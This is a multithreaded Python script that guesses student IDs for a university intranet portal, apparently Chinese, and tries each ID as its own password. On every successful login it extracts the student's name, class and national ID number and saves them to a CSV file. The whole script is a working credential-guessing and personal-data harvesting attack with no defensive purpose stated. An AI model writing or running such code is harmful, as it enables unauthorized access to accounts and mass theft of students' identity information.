import requests, re
import csv
import time, threading
fd = open('studentAll.csv', 'w', newline='')
csvWriter = csv.writer(fd)
def getID(year, startCollege, endCollege):
    url = "http://10.1.68.14/student/studentInfo.jsp?userName=%s&passwd="
    for college in range(startCollege, endCollege):
        flag = 0
        print(college)
        for i in range(101, 800):
            nowID = str(year) + str(college) + str(i).rjust(4, '0')
            tmpUrl = url % nowID
            tmpUrl += nowID
            try:
                result = requests.get(tmpUrl)
            except:
                pass
            if flag == 3:
                break
            if flag != -1 and "登录失败" in result.text:
                flag += 1
                continue
            try:
                flag = -1
                nameParser = '&nbsp;姓名&nbsp;</td>\s*<td bgcolor="#FFFFFF">&nbsp;([\u4e00-\u9fa5·]*)</td>'
                idParser = '<td bgcolor="#FFFFFF">&nbsp;(\d{17}\S)</td>'
                classParser = '\|([\u4e00-\u9fa5()]*\d*)</td>'
                nameSearcher = re.compile(nameParser, re.DOTALL)
                idSearcher = re.compile(idParser, re.DOTALL)
                classSearcher = re.compile(classParser, re.DOTALL)
                print([nowID, classSearcher.findall(result.text)[0], nameSearcher.findall(result.text)[0], idSearcher.findall(result.text)[0]])
                csvWriter.writerow([nowID, classSearcher.findall(result.text)[0], nameSearcher.findall(result.text)[0], idSearcher.findall(result.text)[0]])
            except:
                pass

threads = []
for i in range(2017, 2020):
    for j in range(40):
        tmp = j * 100
        t = threading.Thread(target=getID, args=(i, tmp, tmp + 100))
        threads.append(t)
        t.start()

for i in threads:
    i.join()
print("finished")